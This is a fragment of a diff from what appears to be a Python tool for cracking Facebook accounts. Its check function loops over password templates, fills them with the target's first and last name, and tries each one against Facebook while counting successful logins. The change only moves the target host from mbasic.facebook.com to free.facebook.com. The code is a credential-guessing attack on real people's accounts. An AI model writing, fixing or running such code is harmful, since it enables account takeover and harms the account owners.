@@ -44,7 +44,7 @@ def check(uid,f,l):
     global loop,cpu,oku
     sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
     ses = requests.Session()
-    url = "mbasic.facebook.com"
+    url = "free.facebook.com"
     for pw in p_:
         try:
             pw = pw.replace('first',f).replace('last',l).replace('First',f.capitalize()).replace('Last',l.capitalize())
